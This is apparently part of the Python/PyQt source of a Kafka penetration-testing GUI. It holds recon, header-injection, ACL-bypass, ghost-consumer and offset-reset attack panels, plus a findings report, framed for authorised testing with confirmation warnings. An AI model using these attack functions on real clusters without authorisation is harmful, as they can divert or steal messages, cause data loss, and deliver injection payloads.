        self.btn_stop     = QPushButton("STOP"); self.btn_stop.setObjectName("btn_danger"); self.btn_stop.setEnabled(False)
        btn_row.addWidget(self.btn_all); btn_row.addWidget(self.btn_topology)
        btn_row.addWidget(self.btn_groups); btn_row.addWidget(self.btn_acls)
        btn_row.addSpacing(12); btn_row.addWidget(self.btn_stop); btn_row.addStretch()
        root.addLayout(btn_row)

        # ── Sub-tabs ─────────────────────────────────────────
        recon_tabs = QTabWidget()

        # Topology
        topo_w = QWidget(); topo_v = QVBoxLayout(topo_w); topo_v.setContentsMargins(4, 4, 4, 4)
        topo_split = QSplitter(Qt.Orientation.Horizontal)
        self.tree_brokers = QTreeWidget(); self.tree_brokers.setHeaderLabels(["Brokers"])
        self.tree_brokers.setMaximumWidth(200); topo_split.addWidget(self.tree_brokers)
        self.tree_topics = QTreeWidget(); self.tree_topics.setHeaderLabels(["Topic", "Partitions"])
        self.tree_topics.setColumnWidth(0, 280); topo_split.addWidget(self.tree_topics)
        topo_split.setSizes([180, 400]); topo_v.addWidget(topo_split)
        recon_tabs.addTab(topo_w, "TOPOLOGY")

        # Groups
        grp_w = QWidget(); grp_v = QVBoxLayout(grp_w); grp_v.setContentsMargins(4, 4, 4, 4)
        self.tree_groups = QTreeWidget(); self.tree_groups.setHeaderLabels(["Consumer Group ID"])
        lbl_grp_hint = QLabel("Groups found via AdminClient.list_consumer_groups()")
        lbl_grp_hint.setObjectName("lbl_status_inf")
        grp_v.addWidget(self.tree_groups); grp_v.addWidget(lbl_grp_hint)
        recon_tabs.addTab(grp_w, "GROUPS")

        # ACLs
        acl_w = QWidget(); acl_v = QVBoxLayout(acl_w); acl_v.setContentsMargins(4, 4, 4, 4)
        self.acl_view = LogPane("// ACLs will appear here after DESCRIBE ACLs")
        self.lbl_acl_warn = QLabel(""); self.lbl_acl_warn.setObjectName("lbl_crit"); self.lbl_acl_warn.setWordWrap(True)
        acl_v.addWidget(self.acl_view); acl_v.addWidget(self.lbl_acl_warn)
        recon_tabs.addTab(acl_w, "ACLS")

        root.addWidget(recon_tabs, 1)

        self.recon_log = LogPane("// recon output will appear here")
        self.recon_log.setMaximumHeight(80); root.addWidget(self.recon_log)

        self.btn_all.clicked.connect(lambda: self._run(["topology", "groups", "acls"]))
        self.btn_topology.clicked.connect(lambda: self._run(["topology"]))
        self.btn_groups.clicked.connect(lambda: self._run(["groups"]))
        self.btn_acls.clicked.connect(lambda: self._run(["acls"]))
        self.btn_stop.clicked.connect(self._on_stop)

    def _run(self, phases: list[str]):
        broker = self.inp_broker.text().strip()
        if not broker: self.recon_log.append_line("! broker address required", "error"); return
        if self._worker and self._worker.isRunning():
            self.recon_log.append_line("! recon already running", "warn"); return
        cfg      = self._cert_panel.get_tls_config() if self._cert_panel else {}
        tls_cfg  = cfg.get("broker")
        sasl_cfg = cfg.get("sasl")
        for b in (self.btn_all, self.btn_topology, self.btn_groups, self.btn_acls):
            b.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.recon_log.append_line(f"// starting recon: {phases}  broker={broker}", "muted")
        self._worker = KafkaReconWorker(broker, tls_cfg, phases, sasl_cfg=sasl_cfg)
        self._worker.brokers_found.connect(self._on_brokers)
        self._worker.topics_found.connect(self._on_topics)
        self._worker.groups_found.connect(self._on_groups)
        self._worker.acls_found.connect(self._on_acls)
        self._worker.status.connect(lambda m: self.recon_log.append_line(f"// {m}", "muted"))
        self._worker.error.connect(lambda m: self.recon_log.append_line(f"! {m}", "error"))
        self._worker.done.connect(self._on_done)
        self._worker.start()

    def _on_stop(self):
        if self._worker:
            self._worker.stop()   # clean shutdown via _stop_flag (was: terminate())

    def _on_brokers(self, brokers: list):
        self.tree_brokers.clear()
        for b in brokers:
            parts = b.split(":")
            label = f"b-{parts[0]}  {':'.join(parts[1:])}" if len(parts) >= 3 else b
            QTreeWidgetItem(self.tree_brokers, [label])
        self.recon_log.append_line(f"// {len(brokers)} broker(s): {brokers}", "ok")

    def _on_topics(self, topics: list):
        self.tree_topics.clear()
        for topic, partitions in sorted(topics):
            QTreeWidgetItem(self.tree_topics, [topic, str(partitions)])
        self.recon_log.append_line(f"// {len(topics)} topic(s) discovered", "ok")
        if topics:
            FindingStore.get().add(Finding(
                severity="INFO",
                title=f"Topic enumeration: {len(topics)} topic(s) visible",
                description="Topics visible from the current certificate. Verify only authorised topics are accessible.",
                evidence="\n".join(f"{t} ({p} partitions)" for t, p in topics),
                phase="recon",
            ))

    def _on_groups(self, groups: list):
        self.tree_groups.clear()
        for g in sorted(groups): QTreeWidgetItem(self.tree_groups, [g])

    def _on_acls(self, text: str):
        self.acl_view.clear_log(); has_wildcard = False
        for line in text.splitlines():
            kind = "error" if ("User:*" in line and "Allow" in line) else "data"
            self.acl_view.append_line(line, kind)
            if kind == "error": has_wildcard = True
        self.lbl_acl_warn.setText(
            "[!] CRITICAL: Wildcard ACL (User:*) detected — see FINDINGS tab." if has_wildcard else ""
        )

    def _on_done(self):
        for b in (self.btn_all, self.btn_topology, self.btn_groups, self.btn_acls):
            b.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.recon_log.append_line("// recon complete", "ok")


# ─────────────────────────────────────────────────────────
#  Background worker — consumer group offset reset  [NEW]
# ─────────────────────────────────────────────────────────

class KafkaOffsetWorker(QThread):
    status = pyqtSignal(str)
    error  = pyqtSignal(str)
    done   = pyqtSignal(bool)

    def __init__(self, broker: str, group: str, topic: str,
                 reset_to: str, offset: int,
                 tls_cfg: dict | None, sasl_cfg: dict | None = None):
        super().__init__()
        self.broker   = broker
        self.group    = group
        self.topic    = topic
        self.reset_to = reset_to
        self.offset   = offset
        self.tls_cfg  = tls_cfg
        self.sasl_cfg = sasl_cfg

    def run(self):
        try:
            from confluent_kafka import TopicPartition, Consumer, KafkaException
            from confluent_kafka import OFFSET_BEGINNING, OFFSET_END
            from confluent_kafka.admin import AdminClient
        except ImportError:
            self.error.emit("confluent-kafka not installed"); self.done.emit(False); return

        base_conf = _build_kafka_conf(self.broker, self.tls_cfg, self.sasl_cfg)
        conf = {**base_conf, "group.id": self.group}

        try:
            c    = Consumer({**conf, "enable.auto.commit": False})
            meta = c.list_topics(self.topic, timeout=10); c.close()
            if self.topic not in meta.topics:
                self.error.emit(f"topic '{self.topic}' not found"); self.done.emit(False); return
            pids  = list(meta.topics[self.topic].partitions.keys())
            admin = AdminClient({k: v for k, v in conf.items() if k != "group.id"})

            if self.reset_to == "earliest":
                partitions = [TopicPartition(self.topic, pid, OFFSET_BEGINNING) for pid in pids]
            elif self.reset_to == "latest":
                partitions = [TopicPartition(self.topic, pid, OFFSET_END) for pid in pids]
            else:
                partitions = [TopicPartition(self.topic, pid, self.offset) for pid in pids]

            futures = admin.alter_consumer_group_offsets(
                [{"group.id": self.group, "partitions": partitions}]
            )
            for f in futures.values():
                f.result()

            self.status.emit(
                f"offset reset complete: group={self.group} topic={self.topic} → {self.reset_to}"
            )
            FindingStore.get().add(Finding(
                severity="HIGH",
                title=f"Offset manipulation: {self.group}/{self.topic} → {self.reset_to}",
                description=(
                    f"Successfully reset consumer group '{self.group}' offsets for "
                    f"topic '{self.topic}' to {self.reset_to}. "
                    "This may cause message reprocessing or data loss."
                ),
                evidence=f"group={self.group}  topic={self.topic}  reset_to={self.reset_to}",
                phase="authz",
            ))
            self.done.emit(True)
        except KafkaException as exc:
            self.error.emit(f"kafka error: {exc}"); self.done.emit(False)
        except Exception as exc:
            self.error.emit(f"error: {exc}"); self.done.emit(False)

# ─────────────────────────────────────────────────────────
#  AttackPanel  [NEW]
# ─────────────────────────────────────────────────────────

class AttackPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ ATTACK SCENARIOS ]")
        self._cert_panel  = None
        self._proxy_panel = None
        self._workers: list = []
        self._build()

    def set_cert_panel(self, p):  self._cert_panel  = p
    def set_proxy_panel(self, p):
        self._proxy_panel = p
        self.inj_headers.set_proxy_panel(p)

    def _tls(self) -> dict | None:
        if self._cert_panel:
            return self._cert_panel.get_tls_config().get("broker")
        return None

    def _sasl(self) -> dict | None:
        if self._cert_panel:
            return self._cert_panel.get_tls_config().get("sasl")
        return None

    def _build(self):
        root = QVBoxLayout(self); root.setSpacing(8)
        atk_tabs = QTabWidget()
        atk_tabs.addTab(self._build_inject_tab(),  "HEADER INJECT")
        atk_tabs.addTab(self._build_acl_tab(),     "ACL BYPASS")
        atk_tabs.addTab(self._build_offset_tab(),  "OFFSET ATTACK")
        root.addWidget(atk_tabs, 1)
        self.atk_log = LogPane("// attack output will appear here")
        self.atk_log.setMaximumHeight(130); root.addWidget(self.atk_log)

    # ── Tab 1: Header Injection ───────────────────────────────

    def _build_inject_tab(self) -> QWidget:
        w = QWidget(); v = QVBoxLayout(w); v.setSpacing(8); v.setContentsMargins(8, 8, 8, 8)
        conn = QHBoxLayout()
        lbl_b = QLabel("Broker"); lbl_b.setObjectName("lbl_key")
        self.inj_broker = QLineEdit(); self.inj_broker.setPlaceholderText("broker:9093")
        lbl_t = QLabel("Topic"); lbl_t.setObjectName("lbl_key")
        self.inj_topic  = QLineEdit(); self.inj_topic.setPlaceholderText("topic-name")
        conn.addWidget(lbl_b); conn.addWidget(self.inj_broker, 1)
        conn.addWidget(lbl_t); conn.addWidget(self.inj_topic,  1); v.addLayout(conn)

        body = QHBoxLayout()
        lbl_body = QLabel("Message body"); lbl_body.setObjectName("lbl_key")
        self.inj_body = QLineEdit(); self.inj_body.setText('{"legit":"payload"}')
        body.addWidget(lbl_body); body.addWidget(self.inj_body, 1); v.addLayout(body)

        lbl_hdr = QLabel("Injection headers (payload applied to all value cells):")
        lbl_hdr.setObjectName("lbl_status_inf"); v.addWidget(lbl_hdr)
        self.inj_headers = HeadersWidget(); v.addWidget(self.inj_headers)

        btn_row = QHBoxLayout()
        self.btn_inject = QPushButton("INJECT"); self.btn_inject.setObjectName("btn_accent")
        hint = QLabel("sends 1 message with injection payload in headers")
        hint.setObjectName("lbl_status_inf")
        btn_row.addWidget(self.btn_inject); btn_row.addWidget(hint); btn_row.addStretch()
        v.addLayout(btn_row); v.addStretch()
        self.btn_inject.clicked.connect(self._on_inject)
        return w

    # ── Tab 2: ACL Bypass ────────────────────────────────────

    def _build_acl_tab(self) -> QWidget:
        w = QWidget(); v = QVBoxLayout(w); v.setSpacing(8); v.setContentsMargins(8, 8, 8, 8)
        conn = QHBoxLayout()
        lbl_b = QLabel("Broker"); lbl_b.setObjectName("lbl_key")
        self.acl_broker = QLineEdit(); self.acl_broker.setPlaceholderText("broker:9093")
        conn.addWidget(lbl_b); conn.addWidget(self.acl_broker, 1); v.addLayout(conn)

        tgt = QHBoxLayout()
        lbl_t = QLabel("Target topic (should be FORBIDDEN)"); lbl_t.setObjectName("lbl_key")
        self.acl_topic = QLineEdit(); self.acl_topic.setPlaceholderText("payments.prod")
        tgt.addWidget(lbl_t); tgt.addWidget(self.acl_topic, 1); v.addLayout(tgt)

        grp = QHBoxLayout()
        lbl_g = QLabel("Ghost group ID"); lbl_g.setObjectName("lbl_key")
        self.acl_group = QLineEdit(); self.acl_group.setPlaceholderText("payments-service-prod")
        grp.addWidget(lbl_g); grp.addWidget(self.acl_group, 1); v.addLayout(grp)

        info = QLabel(
            "TEST READ  — tries to consume 1 message from target topic.\n"
            "TEST WRITE — tries to produce a marker message to target topic.\n"
            "GHOST JOIN — joins target consumer group (triggers rebalance)."
        )
        info.setObjectName("lbl_status_inf"); info.setWordWrap(True); v.addWidget(info)

        btns = QHBoxLayout()
        self.btn_acl_read  = QPushButton("TEST READ")
        self.btn_acl_write = QPushButton("TEST WRITE"); self.btn_acl_write.setObjectName("btn_warn")
        self.btn_ghost     = QPushButton("GHOST JOIN"); self.btn_ghost.setObjectName("btn_warn")
        btns.addWidget(self.btn_acl_read); btns.addWidget(self.btn_acl_write)
        btns.addWidget(self.btn_ghost); btns.addStretch(); v.addLayout(btns); v.addStretch()
        self.btn_acl_read.clicked.connect(self._on_acl_read)
        self.btn_acl_write.clicked.connect(self._on_acl_write)
        self.btn_ghost.clicked.connect(self._on_ghost_join)
        return w

    # ── Tab 3: Offset Attack ─────────────────────────────────

    def _build_offset_tab(self) -> QWidget:
        w = QWidget(); grid = QGridLayout(w)
        grid.setSpacing(8); grid.setContentsMargins(8, 8, 8, 8); grid.setColumnStretch(1, 1)
        r = 0
        for lbl_text, attr, ph in [
            ("Broker",         "off_broker", "broker:9093"),
            ("Consumer Group", "off_group",  "target-consumer-group"),
            ("Topic",          "off_topic",  "topic-name"),
        ]:
            lbl = QLabel(lbl_text); lbl.setObjectName("lbl_key")
            inp = QLineEdit(); inp.setPlaceholderText(ph)
            setattr(self, attr, inp)
            grid.addWidget(lbl, r, 0); grid.addWidget(inp, r, 1, 1, 2); r += 1

        lbl_r = QLabel("Reset to"); lbl_r.setObjectName("lbl_key")
        self.cmb_reset = QComboBox()
        self.cmb_reset.addItems(["earliest (replay all)", "latest (skip all / data loss)", "specific offset"])
        self.inp_offset = QSpinBox(); self.inp_offset.setRange(0, 99999999)
        self.inp_offset.setFixedWidth(110); self.inp_offset.setEnabled(False)
        self.cmb_reset.currentIndexChanged.connect(lambda i: self.inp_offset.setEnabled(i == 2))
        grid.addWidget(lbl_r, r, 0); grid.addWidget(self.cmb_reset, r, 1)
        grid.addWidget(self.inp_offset, r, 2); r += 1

        warn = QLabel(
            "⚠  This modifies consumer group commit offsets on the broker.\n"
            "    'earliest' causes re-processing.  'latest' causes message skipping (data loss).\n"
            "    Execute only on groups you own or with explicit client approval."
        )
        warn.setObjectName("lbl_status_warn"); warn.setWordWrap(True)
        grid.addWidget(warn, r, 0, 1, 3); r += 1

        self.btn_offset_exec = QPushButton("EXECUTE OFFSET RESET")
        self.btn_offset_exec.setObjectName("btn_danger"); self.btn_offset_exec.setFixedWidth(220)
        grid.addWidget(self.btn_offset_exec, r, 0, 1, 2)
        self.btn_offset_exec.clicked.connect(self._on_offset_exec)
        return w

    # ── Handlers ─────────────────────────────────────────────

    def _on_inject(self):
        broker  = self.inj_broker.text().strip(); topic = self.inj_topic.text().strip()
        headers = self.inj_headers.get_headers()
        if not broker or not topic:
            self.atk_log.append_line("! broker and topic required", "error"); return
        if not headers:
            self.atk_log.append_line("! add at least one header to inject", "warn"); return
        body_raw = self.inj_body.text().strip().encode("utf-8")
        self.atk_log.append_line(
            f"[INJECT] → {broker}/{topic}  headers={[n for n, _ in headers]}", "warn"
        )
        worker = KafkaProducerWorker(broker, topic, [(None, body_raw)], self._tls(), headers,
                                     sasl_cfg=self._sasl())
        worker.delivery_report.connect(self._on_inject_delivery)
        worker.producer_error.connect(lambda m: self.atk_log.append_line(f"! {m}", "error"))
        worker.done.connect(lambda s, f: self.atk_log.append_line(
            f"[INJECT] done  sent={s}  failed={f}", "ok" if f == 0 else "error"))
        self._workers.append(worker); worker.start()

    def _on_inject_delivery(self, idx, topic, partition, offset, error):
        if error:
            self.atk_log.append_line(f"! delivery failed: {error}", "error")
        else:
            self.atk_log.append_line(
                f"[INJECT] delivered → partition={partition}  offset={offset}", "ok"
            )
            FindingStore.get().add(Finding(
                severity="HIGH",
                title=f"Header injection delivered to topic '{topic}'",
                description=(
                    f"Injection payload delivered to {topic} at partition={partition} offset={offset}. "
                    "Monitor Burp Collaborator for callbacks (Log4Shell JNDI, SSRF)."
                ),
                evidence=f"topic={topic}  partition={partition}  offset={offset}",
                phase="injection",
            ))

    def _on_acl_read(self):
        broker = self.acl_broker.text().strip(); topic = self.acl_topic.text().strip()
        if not broker or not topic:
            self.atk_log.append_line("! broker and topic required", "error"); return
        self.atk_log.append_line(f"[ACL-READ] testing read access on '{topic}' …", "warn")
        worker = KafkaConsumerWorker(broker, topic, "kafkapt-acl-probe", "latest", 0, 1,
                                     self._tls(), sasl_cfg=self._sasl())
        worker.message_received.connect(lambda *a: self._acl_read_success(topic))
        worker.consumer_error.connect(lambda m: self.atk_log.append_line(f"[ACL-READ] blocked: {m}", "ok"))
        worker.done.connect(lambda t: self.atk_log.append_line(
            f"[ACL-READ] no messages received (ACL may be correct or topic is empty)", "info") if t == 0 else None)
        self._workers.append(worker); worker.start()

    def _acl_read_success(self, topic: str):
        self.atk_log.append_line(f"[ACL-READ] [!] CRITICAL: read from '{topic}' succeeded!", "crit")
        FindingStore.get().add(Finding(
            severity="CRITICAL",
            title=f"ACL Bypass — unauthorized read from topic '{topic}'",
            description=(
                f"The current certificate consumed messages from '{topic}' without explicit ACL permission. "
                "Indicates misconfigured ACLs (wildcard or missing deny rule)."
            ),
            evidence=f"Consumer received message from topic='{topic}'",
            phase="authz",
        ))

    def _on_acl_write(self):
        broker = self.acl_broker.text().strip(); topic = self.acl_topic.text().strip()
        if not broker or not topic:
            self.atk_log.append_line("! broker and topic required", "error"); return
        marker = json.dumps({
            "pentest": "kafkapt-acl-write-marker", "tool": "kafkapt-v2",
            "ts": datetime.datetime.utcnow().isoformat(),
        }).encode()
        self.atk_log.append_line(f"[ACL-WRITE] testing write access on '{topic}' …", "warn")
        worker = KafkaProducerWorker(broker, topic, [(None, marker)], self._tls(),
                                     sasl_cfg=self._sasl())
        worker.delivery_report.connect(
            lambda idx, t, part, off, err: (
                self.atk_log.append_line(
                    f"[ACL-WRITE] [!] CRITICAL: write succeeded → partition={part}  offset={off}", "crit"
                ) if not err else
                self.atk_log.append_line(f"[ACL-WRITE] blocked: {err}", "ok")
            )
        )
        worker.producer_error.connect(lambda m: self.atk_log.append_line(f"[ACL-WRITE] blocked: {m}", "ok"))
        worker.done.connect(lambda s, f: (
            FindingStore.get().add(Finding(
                severity="CRITICAL",
                title=f"ACL Bypass — unauthorized write to topic '{topic}'",
                description=(
                    f"The current certificate produced messages to '{topic}' without explicit ACL permission. "
                    "May allow data injection or supply chain attacks."
                ),
                evidence=f"Producer delivered marker to topic='{topic}'",
                phase="authz",
            )) if s > 0 else None
        ))
        self._workers.append(worker); worker.start()

    def _on_ghost_join(self):
        broker = self.acl_broker.text().strip()
        topic  = self.acl_topic.text().strip()
        group  = self.acl_group.text().strip()
        if not broker or not topic or not group:
            self.atk_log.append_line("! broker, topic, and group all required", "error"); return
        reply = QMessageBox.warning(
            self, "Ghost Consumer — Confirm",
            f"Join group '{group}' on topic '{topic}'.\n\n"
            "Kafka will rebalance partitions — legitimate consumers in this group\n"
            "may temporarily lose messages.\n\n"
            "Proceed only with explicit authorisation.",
            QMessageBox.StandardButton.Ok | QMessageBox.StandardButton.Cancel,
        )
        if reply != QMessageBox.StandardButton.Ok: return
        self.atk_log.append_line(f"[GHOST] joining group '{group}' on topic '{topic}' …", "warn")
        worker = KafkaConsumerWorker(broker, topic, group, "latest", 0, 5,
                                     self._tls(), sasl_cfg=self._sasl())
        worker.message_received.connect(
            lambda tp, part, off, ts_t, ts_ms, decoded, raw, hdrs: (
                self.atk_log.append_line(
                    f"[GHOST] message received! partition={part}  offset={off}", "crit"
                ),
                FindingStore.get().add(Finding(
                    severity="CRITICAL",
                    title=f"Ghost Consumer — messages stolen from group '{group}'",
                    description=(
                        f"Joined consumer group '{group}' and received messages from topic '{topic}'. "
                        "Kafka rebalanced partitions, diverting messages from legitimate consumers."
                    ),
                    evidence=f"partition={part}  offset={off}\n{decoded[:400]}",
                    phase="authz",
                ))
            )
        )
        worker.consumer_error.connect(lambda m: self.atk_log.append_line(f"[GHOST] error: {m}", "error"))
        worker.done.connect(lambda t: self.atk_log.append_line(f"[GHOST] done  {t} message(s) received", "ok"))
        self._workers.append(worker); worker.start()

    def _on_offset_exec(self):
        broker = self.off_broker.text().strip()
        group  = self.off_group.text().strip()
        topic  = self.off_topic.text().strip()
        if not broker or not group or not topic:
            self.atk_log.append_line("! broker, group, and topic all required", "error"); return
        reset_map = {0: "earliest", 1: "latest", 2: "specific"}
        reset_to  = reset_map[self.cmb_reset.currentIndex()]
        note = "This will SKIP messages (data loss)." if reset_to == "latest" else "This will cause RE-PROCESSING of all messages."
        reply = QMessageBox.warning(
            self, "Offset Reset — Confirm",
            f"Reset group '{group}' on topic '{topic}' to {reset_to.upper()}.\n\n{note}\n\n"
            "Proceed only with explicit authorisation.",
            QMessageBox.StandardButton.Ok | QMessageBox.StandardButton.Cancel,
        )
        if reply != QMessageBox.StandardButton.Ok: return
        self.atk_log.append_line(
            f"[OFFSET] resetting group='{group}'  topic='{topic}'  → {reset_to} …", "warn"
        )
        worker = KafkaOffsetWorker(broker, group, topic, reset_to, self.inp_offset.value(),
                                   self._tls(), sasl_cfg=self._sasl())
        worker.status.connect(lambda m: self.atk_log.append_line(f"[OFFSET] {m}", "ok"))
        worker.error.connect(lambda m: self.atk_log.append_line(f"[OFFSET] error: {m}", "error"))
        worker.done.connect(lambda ok: self.atk_log.append_line(
            "[OFFSET] complete" if ok else "[OFFSET] failed", "ok" if ok else "error"
        ))
        self._workers.append(worker); worker.start()


# ─────────────────────────────────────────────────────────
#  FindingsPanel  [NEW]
# ─────────────────────────────────────────────────────────

SEVERITY_COLORS = {
    "CRITICAL": "#cf4444", "HIGH": "#c87020",
    "MEDIUM": "#8a8020", "LOW": "#4a8040", "INFO": "#4a8080",
}

class FindingsPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ FINDINGS ]")
        self._items: list[Finding] = []
        self._build()
        FindingStore.get().register_callback(self._on_new_finding)

    def _build(self):
        root = QVBoxLayout(self); root.setSpacing(8)
        top = QHBoxLayout()
        self.lbl_count = QLabel("0 findings"); self.lbl_count.setObjectName("lbl_status_inf")
        self.btn_export = QPushButton("EXPORT MARKDOWN"); self.btn_export.setObjectName("btn_accent")
        self.btn_fp     = QPushButton("MARK FALSE POSITIVE")
        self.btn_clear  = QPushButton("CLEAR ALL"); self.btn_clear.setObjectName("btn_danger")
        top.addWidget(self.lbl_count); top.addStretch()
        top.addWidget(self.btn_fp); top.addWidget(self.btn_export); top.addWidget(self.btn_clear)
        root.addLayout(top)

        splitter = QSplitter(Qt.Orientation.Horizontal); splitter.setHandleWidth(4)

        self.findings_list = QTreeWidget()
        self.findings_list.setHeaderLabels(["Sev", "Title", "Phase", "Time"])
        self.findings_list.setColumnWidth(0, 80); self.findings_list.setColumnWidth(1, 280)
        self.findings_list.setColumnWidth(2, 80); self.findings_list.setAlternatingRowColors(True)
        splitter.addWidget(self.findings_list)

        self.detail_view = QTextEdit(); self.detail_view.setReadOnly(True)
        self.detail_view.setFont(QFont("Courier New", 11))
        self.detail_view.setPlaceholderText("// select a finding to view details")
        splitter.addWidget(self.detail_view); splitter.setSizes([380, 380])
        root.addWidget(splitter, 1)

        self.btn_export.clicked.connect(self._on_export)
        self.btn_fp.clicked.connect(self._on_mark_fp)
        self.btn_clear.clicked.connect(self._on_clear)
        self.findings_list.currentItemChanged.connect(self._on_selection)

    def _on_new_finding(self, finding: Finding):
        self._items.append(finding); self._refresh_list()

    def _sorted(self) -> list[Finding]:
        return sorted(self._items, key=lambda x: SEVERITY_ORDER.get(x.severity, 99))

    def _refresh_list(self):
        self.findings_list.clear()
        for f in self._sorted():
            fp_note = " [FP]" if f.false_positive else ""
            item = QTreeWidgetItem([f.severity + fp_note, f.title[:60], f.phase, f.timestamp[11:19]])
            item.setForeground(0, QColor(SEVERITY_COLORS.get(f.severity, "#888888")))
            self.findings_list.addTopLevelItem(item)
        self.lbl_count.setText(f"{len(self._items)} finding(s)")

    def _on_selection(self, current, _prev):
        if current is None: return
        idx = self.findings_list.indexOfTopLevelItem(current)
        findings = self._sorted()
        if 0 <= idx < len(findings):
            f = findings[idx]
            fp_note = "\n[MARKED AS FALSE POSITIVE]" if f.false_positive else ""
            self.detail_view.setPlainText(
                f"SEVERITY : {f.severity}{fp_note}\n"
                f"TITLE    : {f.title}\n"
                f"PHASE    : {f.phase}\n"
                f"TIME     : {f.timestamp}\n"
                f"{'─' * 60}\n"
                f"DESCRIPTION:\n{f.description}\n"
                f"{'─' * 60}\n"
                f"EVIDENCE:\n{f.evidence}\n"
            )

    def _on_mark_fp(self):
        idx = self.findings_list.currentIndex().row()
        findings = self._sorted()
        if 0 <= idx < len(findings):
            findings[idx].false_positive = not findings[idx].false_positive
            self._refresh_list()

    def _on_export(self):
        if not self._items: QMessageBox.information(self, "Export", "No findings to export."); return
        path, _ = QFileDialog.getSaveFileName(self, "Export findings", "kafkapt-findings.md",
                                               "Markdown (*.md);;All Files (*)")
        if not path: return
        try:
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(FindingStore.get().export_markdown())
            QMessageBox.information(self, "Export", f"Saved to:\n{path}")
        except Exception as exc:
            QMessageBox.critical(self, "Export Error", str(exc))

    def _on_clear(self):
        reply = QMessageBox.question(self, "Clear All Findings",
            "Permanently clear all findings from this session.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            FindingStore.get().clear(); self._items.clear()
            self.findings_list.clear(); self.detail_view.clear(); self.lbl_count.setText("0 findings")


# ─────────────────────────────────────────────────────────
#  MainWindow  v2.0
# ─────────────────────────────────────────────────────────

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self._dark_mode = True
        self._scale     = 1.0          # current font scale factor
        self.setWindowTitle("KafkaPT v2.0  //  Kafka Pentest Toolkit")
        self.resize(1200, 900); self._build()
        self.status_bar = QStatusBar(); self.setStatusBar(self.status_bar)
        self.status_bar.showMessage(
            "KafkaPT v2.0 ready  —  configure certs, run RECON to map the environment, then ATTACK"
        )

    def _build(self):
        central = QWidget(); self.setCentralWidget(central)
        root = QVBoxLayout(central); root.setContentsMargins(12, 10, 12, 10); root.setSpacing(10)

        # Header
        header_row = QHBoxLayout()
        self.lbl_header = QLabel("KAFKAPT")
        self.lbl_header.setFont(QFont("Courier New", 22, QFont.Weight.Bold))
        self.lbl_header.setStyleSheet("color: #4caf50; letter-spacing: 8px; padding: 4px 0;")

        lbl_scale = QLabel("Font:")
        lbl_scale.setObjectName("lbl_key")
        lbl_scale.setFixedWidth(36)
        self.cmb_scale = QComboBox()
        self.cmb_scale.addItems(["100%", "125%", "150%", "175%"])
        self.cmb_scale.setFixedWidth(72)
        self.cmb_scale.setToolTip("Font scale — use 125%+ on HiDPI / 4K displays")
        self.cmb_scale.currentTextChanged.connect(
            lambda t: self._apply_scale(int(t.rstrip("%")) / 100)
        )

        self.btn_theme = QPushButton("☀  LIGHT"); self.btn_theme.setFixedWidth(110)
        self.btn_theme.clicked.connect(self._toggle_theme)
        header_row.addWidget(self.lbl_header)
        header_row.addStretch()
        header_row.addWidget(lbl_scale)
        header_row.addWidget(self.cmb_scale)
        header_row.addSpacing(12)
        header_row.addWidget(self.btn_theme)
        root.addLayout(header_row)

        self.lbl_sub = QLabel("Kafka Pentest Toolkit  /  v2.0  /  Sprint 1+2")
        self.lbl_sub.setStyleSheet("color: #2e5a2e; letter-spacing: 3px; font-size: 11px;")
        root.addWidget(self.lbl_sub)
        sep = QFrame(); sep.setFrameShape(QFrame.Shape.HLine); root.addWidget(sep)

        # ── Config tabs ──────────────────────────────────────
        cfg_tabs = QTabWidget(); cfg_tabs.setMaximumHeight(340)
        self.schema_panel = SchemaPanel()
        self.cert_panel   = CertPanel()
        self.enc_panel    = EncryptionPanel()
        self.proxy_panel  = ProxyPanel()
        self.schema_panel.set_cert_panel(self.cert_panel)
        self.schema_panel.set_proxy_panel(self.proxy_panel)
        cfg_tabs.addTab(self.schema_panel, "SCHEMA")
        cfg_tabs.addTab(self.cert_panel,   "CERTIFICATES")
        cfg_tabs.addTab(self.enc_panel,    "ENCRYPTION")
        cfg_tabs.addTab(self.proxy_panel,  "PROXY / BURP")
        root.addWidget(cfg_tabs)

        # ── Ops tabs ─────────────────────────────────────────
        ops_tabs = QTabWidget()
        self.rand_panel     = RandomizerPanel()
        self.reader_panel   = ReaderPanel()
        self.writer_panel   = WriterPanel()
        self.recon_panel    = ReconPanel()
        self.attack_panel   = AttackPanel()
        self.findings_panel = FindingsPanel()

        self.rand_panel.set_schema_panel(self.schema_panel)
        self.reader_panel.set_cert_panel(self.cert_panel)
        self.reader_panel.set_schema_panel(self.schema_panel)
        self.writer_panel.set_cert_panel(self.cert_panel)
        self.writer_panel.set_enc_panel(self.enc_panel)
        self.writer_panel.set_schema_panel(self.schema_panel)
        self.writer_panel.set_rand_panel(self.rand_panel)
        self.writer_panel.set_proxy_panel(self.proxy_panel)
        self.recon_panel.set_cert_panel(self.cert_panel)
        self.attack_panel.set_cert_panel(self.cert_panel)
        self.attack_panel.set_proxy_panel(self.proxy_panel)

        ops_tabs.addTab(self.recon_panel,    "RECON")
        ops_tabs.addTab(self.attack_panel,   "ATTACK")
        ops_tabs.addTab(self.reader_panel,   "READ")
        ops_tabs.addTab(self.writer_panel,   "SEND")
        ops_tabs.addTab(self.rand_panel,     "RANDOMIZE")
        ops_tabs.addTab(self.findings_panel, "FINDINGS")
        root.addWidget(ops_tabs, 1)

    def _toggle_theme(self):
        self._dark_mode = not self._dark_mode
        LogPane.set_dark_mode(self._dark_mode)
        self._apply_scale(self._scale)                          # rebuilds CSS + QFonts
        color = "#4caf50" if self._dark_mode else "#2e7d32"
        self.lbl_header.setStyleSheet(
            f"color: {color}; letter-spacing: 8px; padding: 4px 0;"
        )
        self.btn_theme.setText("☀  LIGHT" if self._dark_mode else "☾  DARK")

    def _apply_scale(self, scale: float):
        """Apply font scale to CSS stylesheet and all QFont-based widgets."""
        self._scale = scale

        # 1. Rebuild application stylesheet with new scale
        QApplication.instance().setStyleSheet(_make_style(self._dark_mode, scale))

        # 2. Update all QTextEdit / LogPane instances (they use QFont, not CSS)
        mono_size = max(8, int(11 * scale))
        mono_font = QFont("Courier New", mono_size)
        for widget in self.findChildren(QTextEdit):
            widget.setFont(mono_font)

        # 3. Update header logo (large QFont)
        header_size = max(14, int(22 * scale))
